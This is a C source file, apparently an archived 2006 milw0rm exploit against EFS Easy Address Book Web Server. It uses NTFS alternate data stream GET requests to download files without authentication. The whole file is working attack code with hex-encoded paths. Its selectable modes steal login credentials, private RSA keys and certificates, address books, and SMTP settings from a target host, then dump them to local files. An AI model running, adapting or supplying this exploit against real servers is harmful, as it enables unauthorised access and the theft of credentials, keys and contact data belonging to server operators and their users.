/*
==========================================================================
0-day Alternative File Stream Exploit for EFS Easy Address Book Web Server
===========================================================================
EFS' Easy Address Book Web Server is vulnerable to file stream exploits which
can be exploited remotely to access files without authentification.

This could lead to server compromise and/or sensitive information disclosure.


0-day Easy Address Book Web Server Alternative File Stream Exploit
Discovered and Coded by Greg Linares ==> GLinares.code [at] gmail [dot] com
This tool demonstrates EFS' Easy Address Book Web Server Vulnerability to Alternative
Data Stream GET requests which allow unauthorized users to download server
critical files.

Discovered and Reported: 11-1-2006

Usage: exploit <hostname/IP> [port 80=default] [Method see below]

--------PoC Methods:-----
1 = Gather all login username and passwords and email addresses.
2 = Gather Private RSA Keys and Certificates for server.
3 = Gather All Addressbooks and Contact Info on the server.
4 = Gather Server Settings File and SMTP server info.



*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>		/* Win32 API */
#include <wininet.h>		/* WinInet API */
int mthd;
unsigned short httpport;
char exploit[512], exploit2[512], exploit3[512], exploit4[512], exploit5[512], exploit6[512];
char logmsg[512];
char endmsg[512];
HINTERNET inet;			/* WinInet Internet Handle */
FILE *file;

void ExploitHTTP (HINTERNET inet, const char *host, const char *exp)
{

  	HINTERNET connection;		/* Connection Handle */
    HINTERNET request;			/* Request Handle */
    unsigned long flags;		/* HttpOpenRequest Flags */

	char buffer[BUFSIZ];
    unsigned long len;


	printf("HOST: %s\n", host);
	printf("PORT: %i\n", httpport);

	if ((connection = InternetConnect(inet, host, httpport,
				      NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0))
	    == NULL)
	{
		printf("Failed to Connect...Exiting\n");
		InternetCloseHandle(inet);
		fclose(file);
		exit(1);
	}

	flags = INTERNET_FLAG_NO_AUTH | INTERNET_FLAG_NO_AUTO_REDIRECT |
	    INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES |
	    INTERNET_FLAG_RELOAD;

	strcat(exp, "%3A%3A%24%44%41%54%41");

	request = HttpOpenRequest(connection, "GET", exp, "HTTP/1.0", NULL, NULL, flags, 0);
	if (request == NULL)
	{
		printf("HTTP Open Request failed....Exiting\n");
		InternetCloseHandle(connection);
		InternetCloseHandle(inet);
		fclose(file);
		exit(1);
	}
	if (!HttpSendRequest(request, NULL, 0, NULL, 0))
	{
		printf("HTTP Send Request failed....Exiting\n");
		InternetCloseHandle(request);
		InternetCloseHandle(connection);
		InternetCloseHandle(inet);
		fclose(file);
		exit(1);
	}
	printf("Exploit Sent...Dumping HTTP Return Packet...");
	sleep(1000);

	while (InternetReadFile(request, buffer, sizeof buffer, &len) && len > 0)
	{
		fwrite(buffer, len, 1, file);
		if (fwrite(buffer, len, 1, stdout) < 1)
		{
				printf("Error Outputting HTTP Return Packet\n");
		}
	}
	InternetCloseHandle(request);
    InternetCloseHandle(connection);
}


int main (int argc, char *argv[])
{

	printf("\n=========================================================================\n");
	printf("0-day Easy Address Book Web Server Alternative File Stream Exploit\n");
	printf("Discovered and Coded by Greg Linares ==> GLinares.code [at] gmail [dot] com\n");
	printf("This tool demonstrates EFS Address Book Server's Vulnerability to Alternative\n");
	printf("Data Stream GET requests which allow unauthorized users to download server \n");
	printf("critical files.\n");
	printf("Discovered and Reported: 11-1-2006\n");
	printf("\nUsage: %s <hostname/IP> [port 80=default] [Method see below]\n", argv[0]);
	printf("--------PoC Methods:-----\n");
	printf("1 = Gather all login username and passwords and email addresses.[Default]\n");
	printf("2 = Gather Private RSA Keys and Certificates for server.\n");
	printf("3 = Gather All Address Books and Contact Information on the server\n");
	printf("4 = Gather Server Settings File and SMTP server info.\n");
	printf("============================================================================\n");


    inet = InternetOpen("ESF Exp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (inet == NULL)
	{
		printf("Error accessing InternetOpen API - Exiting...\n");
		exit(1);
	}
	if (argc < 2)
	{
		printf("Invalid # of arguments...Exiting\n");
		exit(1);
	}
	if (atoi(argv[3]) > 4)
	{
		mthd = 1;
	}
	if (atoi(argv[3]) <= 0)
	{
		mthd = 1;
	}
	mthd = atoi(argv[3]);

	/* Set Up Exploits */
	switch(mthd)
	{
    	case 1:
			file = fopen("Accounts.txt","a+");
			sprintf(exploit, "%s", "%2F%61%64%64%72%62%6F%6F%6B%2F%75%73%65%72%2E%73%64%62");
			sprintf(endmsg, "%s", "\n\n\nResults Dumped to Accounts.txt\n");
			break;
		case 2:
			file = fopen("RSAKeys.txt", "a+");
			sprintf(exploit, "%s", "%53%65%72%76%65%72%4B%65%79%2E%70%65%6D");
			sprintf(endmsg, "%s", "\n\n\nResults Dumped to RSAKeys.txt\n");
			break;
		case 3:
			file = fopen("AddrBooks.txt", "a+");
			sprintf(exploit, "%s", "%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%31%2E%73%64%62");
			sprintf(endmsg, "%s", "\n\n\nResults Dumped to Messages.txt\n");
			break;
		case 4:
			file = fopen("Server.txt", "a+");
			sprintf(exploit, "%s", "%6F%70%74%69%6F%6E%2E%69%6E%69");
			sprintf(endmsg, "%s", "\n\n\nResults Dumped to Server.txt\n");
			break;
	}



	sprintf(logmsg, "%s", argv[1]);
	sprintf(logmsg, "%s", "\r\n\r\n\r\n");
	fwrite(logmsg, strlen(logmsg), 1, file);
	httpport = atoi(argv[2]);
	ExploitHTTP(inet, argv[1], exploit);
	if (mthd == 3)
	{
		printf("\n\n Sending 2nd Exploit...\n");
		strcat(exploit2, "%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%32%2E%73%64%62");
		ExploitHTTP(inet, argv[1], exploit2);
		printf("\n\n Sending 3rd Exploit...\n");
		strcat(exploit3, "%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%33%2E%73%64%62");
		ExploitHTTP(inet, argv[1], exploit3);
		printf("\n\n Sending 4th Exploit...\n");
		strcat(exploit4, "%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%5F%75%73%65%72%2E%73%64%62");
		ExploitHTTP(inet, argv[1], exploit4);
		printf("\n\n Sending final Exploit...\n");
		strcat(exploit5, "%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%67%72%6F%75%70%2E%73%64%62");
		ExploitHTTP(inet, argv[1], exploit5);
	}
	if (mthd == 2)
	{
		printf("\n\n Sending 2nd Exploit...\n");
		strcat(exploit2, "%53%65%72%76%65%72%43%65%72%74%2E%70%65%6D");
		ExploitHTTP(inet, argv[1], exploit2);
		printf("\n\n Sending 3rd Exploit...\n");
		strcat(exploit3, "%52%6F%6F%74%43%65%72%74%2E%70%65%6D");
		ExploitHTTP(inet, argv[1], exploit3);
		printf("\n\n Sending 4th Exploit...\n");
		strcat(exploit4, "%65%66%73%77%73%5F%6B%65%79%2E%70%65%6D");
		ExploitHTTP(inet, argv[1], exploit4);
		printf("\n\n Sending 5th Exploit...\n");
		strcat(exploit5, "%65%66%73%77%73%5F%72%65%71%2E%70%65%6D");
		ExploitHTTP(inet, argv[1], exploit5);
		printf("\n\n Sending final Exploit...\n");
		strcat(exploit6, "%65%66%73%77%73%5F%72%61%6E%64%2E%74%78%74");
		ExploitHTTP(inet, argv[1], exploit6);
	}

	fclose(file);
    Sleep(500);
    InternetCloseHandle(inet);
	printf("\n\n===================================================\n");
	printf("%s\n", endmsg);
	printf("Proof Of Concept Exploit by Greg Linares\n");
	printf("Send Comments/Concerns/Questions/Etc to GLinares.code [at] gmail [dot] com\n");
    return 0;

}

// milw0rm.com [2006-11-01]